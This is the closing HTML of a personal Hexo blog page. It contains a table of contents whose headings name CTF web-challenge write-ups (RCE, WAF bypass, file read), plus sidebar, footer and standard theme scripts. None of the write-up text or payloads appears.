class="toc-number">2.2.</span> <span class="toc-text">Watch</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AD%94%E6%A1%88%E8%AF%B4%E6%98%AFGo%E8%AF%AD%E8%A8%80%EF%BC%8C%E6%80%8E%E4%B9%88%E7%9C%8B%E5%87%BA%E6%9D%A5%E7%9A%84%EF%BC%9F"><span class="toc-number">2.2.0.0.1.</span> <span class="toc-text">答案说是Go语言，怎么看出来的？</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
      
  </div>
</div>
</div>
        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Flight-star" class="lazyload">
  <div class="sidebar-author-name">Flight-star</div>
  <div class="sidebar-description"></div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    <div class="sidebar-state-number">69</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">0</div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">11</div>
  </div>
</div>
<div class="sidebar-social">
  
</div>
<div class="sidebar-menu">
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">Home</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">Archives</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">About</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">Friend</div>
    </div>
  
</div>
</div>
      
      
        <div class="sidebar-btn-wrapper" style="position:static">
          <div class="sidebar-toc-btn current"></div>
          <div class="sidebar-common-btn"></div>
        </div>
      
    </div>
  </div>

  
</aside>

          
        </div>
        <footer id="footer">
  <div style="width: 100%; overflow: hidden">
    <div class="footer-line"></div>
  </div>
  <div id="footer-info">
    
    <div>
      <span class="icon-copyright"></span>
      2020-2025
      <span class="footer-info-sep"></span>
      Flight-star
    </div>
    
      <div>
        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
      </div>
    
    
      <div>
        <span class="icon-brush"></span>
        65.1k
        &nbsp;|&nbsp;
        <span class="icon-coffee"></span>
        05:01
      </div>
    
    
    
    
      <div>
        <span class="icon-eye"></span>
        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
        &nbsp;|&nbsp;
        <span class="icon-user"></span>
        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
      </div>
    
  </div>
</footer>

        <div class="sidebar-top">
          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
          <div class="arrow-up"></div>
        </div>
        <div id="mask"></div>
      </div>
      <nav id="mobile-nav">
  <div class="sidebar-wrap">
    
      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class" >
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B2%A1%E6%89%93%E7%AE%97%E8%AE%A4%E7%9C%9F%E5%86%99%EF%BC%8C%E7%A8%8D%E5%BE%AE%E5%86%99%E4%B8%80%E7%82%B9%E4%BF%9D%E6%8C%81%E6%89%8B%E6%84%9F%E5%90%A7%EF%BC%81%EF%BC%81"><span class="toc-number">1.0.0.0.1.</span> <span class="toc-text">没打算认真写，稍微写一点保持手感吧！！</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DeceptiFlag"><span class="toc-number">1.1.</span> <span class="toc-text">DeceptiFlag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">测试：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%B7%E5%BA%B7%E6%BA%90%E7%A0%81%EF%BC%9A"><span class="toc-number">1.1.2.</span> <span class="toc-text">康康源码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%8F%E8%BF%87%E4%B8%8D%E6%96%AD%E6%B5%8B%E8%AF%95%EF%BC%9A"><span class="toc-number">1.1.3.</span> <span class="toc-text">经过不断测试：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%9A"><span class="toc-number">1.1.4.</span> <span class="toc-text">文件读取：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Really-Ez-Rce"><span class="toc-number">2.</span> <span class="toc-text">Really_Ez_Rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.0.1.</span> <span class="toc-text">考察点：代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%EF%BC%9A"><span class="toc-number">2.0.2.</span> <span class="toc-text">源码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87preg-match-d-inputNumber"><span class="toc-number">2.0.3.</span> <span class="toc-text">绕过preg_match(&#39;&#x2F;\d&#x2F;&#39;, $inputNumber)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%EF%BC%9Acmd%E7%9A%84WAF"><span class="toc-number">2.0.4.</span> <span class="toc-text">绕过：cmd的WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%EF%BC%9A-1"><span class="toc-number">2.0.4.1.</span> <span class="toc-text">测试：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp%EF%BC%9A"><span class="toc-number">2.0.5.</span> <span class="toc-text">exp：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-number">2.0.5.1.</span> <span class="toc-text">法一：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">2.0.5.1.1.</span> <span class="toc-text">拼接绕过：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-number">2.0.5.2.</span> <span class="toc-text">法二：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%82%B9%E6%92%87%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">2.0.5.2.1.</span> <span class="toc-text">点撇绕过：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%89%EF%BC%9A"><span class="toc-number">2.0.5.3.</span> <span class="toc-text">法三：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%87%E6%80%AA%E7%9A%84%E5%92%96%E5%95%A1%E5%BA%97"><span class="toc-number">2.1.</span> <span class="toc-text">奇怪的咖啡店</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9A%E6%B1%A1%E6%9F%93%E9%A2%98"><span class="toc-number">2.1.1.</span> <span class="toc-text">考察点：污染题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%BC%80-add%E9%A1%B5%E9%9D%A2%E6%9F%A5%E7%9C%8B%EF%BC%9A"><span class="toc-number">2.1.2.</span> <span class="toc-text">打开&#x2F;add页面查看：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.1.3.</span> <span class="toc-text">exp:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%EF%BC%9A"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">文件任意读取：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0admin"><span class="toc-number">2.1.3.2.</span> <span class="toc-text">伪造admin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E7%9F%A5%E9%81%93%E4%B8%BA%E4%BB%80%E4%B9%88%EF%BC%8C%E6%88%91%E7%9A%84%E6%B5%8B%E8%AF%95%E8%80%81%E6%98%AF%E5%A4%B1%E8%B4%A5%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82"><span class="toc-number">2.1.3.3.</span> <span class="toc-text">不知道为什么，我的测试老是失败。。。。。</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%88tm%E5%BF%98%E8%AE%B0%E5%8A%A0%EF%BC%9AContent-Type-application-json"><span class="toc-number">2.1.3.3.1.</span> <span class="toc-text">又tm忘记加：Content-Type: application&#x2F;json</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%EF%BC%8C%E8%AF%BB%E5%8F%96%E5%87%BA%E5%AF%86%E9%92%A5%E4%B8%8D%E5%B0%B1%E5%A5%BD%E4%BA%86%EF%BC%9F"><span class="toc-number">2.1.3.4.</span> <span class="toc-text">直接读取文件，读取出密钥不就好了？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%94%E6%A1%88%E5%81%9A%E6%B3%95%EF%BC%9A"><span class="toc-number">2.1.3.5.</span> <span class="toc-text">答案做法：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E6%9C%89%E5%87%BA%E7%8E%B0%EF%BC%9AYour-permissions-are1"><span class="toc-number">2.1.3.5.1.</span> <span class="toc-text">发现有出现：Your permissions are1</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E4%B8%80%E4%B8%AA%E6%89%BE%EF%BC%9A"><span class="toc-number">2.1.3.6.</span> <span class="toc-text">一个一个找：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E6%8C%87%E4%BB%A4%E6%89%BE%EF%BC%9A"><span class="toc-number">2.1.3.7.</span> <span class="toc-text">也可以直接指令找：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Watch"><span class="toc-number">2.2.</span> <span class="toc-text">Watch</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AD%94%E6%A1%88%E8%AF%B4%E6%98%AFGo%E8%AF%AD%E8%A8%80%EF%BC%8C%E6%80%8E%E4%B9%88%E7%9C%8B%E5%87%BA%E6%9D%A5%E7%9A%84%EF%BC%9F"><span class="toc-number">2.2.0.0.1.</span> <span class="toc-text">答案说是Go语言，怎么看出来的？</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
      
  </div>
</div>
</div>
      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Flight-star" class="lazyload">
  <div class="sidebar-author-name">Flight-star</div>
  <div class="sidebar-description"></div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    <div class="sidebar-state-number">69</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">0</div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">11</div>
  </div>
</div>
<div class="sidebar-social">
  
</div>
<div class="sidebar-menu">
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">Home</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">Archives</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">About</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">Friend</div>
    </div>
  
</div>
</div>
    
  </div>
  
    <div class="sidebar-btn-wrapper">
      <div class="sidebar-toc-btn current"></div>
      <div class="sidebar-common-btn"></div>
    </div>
  
</nav>

    </div>
    
    
<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>


<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>



<script src="/js/script.js"></script>



  
<script src="/js/aos.js"></script>

  <script>
    var aosInit = () => {
      AOS.init({
        duration: 1000,
        easing: "ease",
        once: true,
        offset: 50,
      });
    };
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', aosInit);
    } else {
      aosInit();
    }
  </script>



<script src="/js/pjax_script.js" data-pjax></script>


<script type="module" data-pjax>
  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js";
  
  const pswp = () => {
    if (_$$('.article-entry a.article-gallery-item').length > 0) {
      new PhotoSwipeLightbox({
        gallery: '.article-entry',
        children: 'a.article-gallery-item',
        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
      }).init();
    }
    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
      new PhotoSwipeLightbox({
        gallery: '.article-gallery',
        children: 'a.article-gallery-item',
        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
      }).init();
    }
    window.lightboxStatus = 'done';
    window.removeEventListener('lightbox:ready', pswp);
  }
  if(window.lightboxStatus === 'ready') {
    pswp()
  } else {
    window.addEventListener('lightbox:ready', pswp);
  }
</script>
















  
<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>

  <script>
    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
  </script>







  
<script src="https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js"></script>

  <script data-pjax>
    window.quicklink?.listen({
      timeout: 3000,
      priority: true,
      ignores: []
    });
  </script>


<div id="lazy-script">
  <div>
    
  </div>
</div>


  <script>
    console.log(String.raw`%c 
 ______     ______     __     __    __     __  __    
/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
 \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
                                                  
`,'color: #ff5252;')
    console.log('%c Theme.Reimu v' + '0.3.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
  </script>
  



  
<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>




<script>
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.getRegistrations().then((registrations) => {
      for (let registration of registrations) {
        registration.unregister();
      }
    });
  }
</script>

  <!-- hexo injector body_end start -->
<script src="/js/insert_highlight.js" data-pjax></script>
<!-- hexo injector body_end end --></body>
  </html>

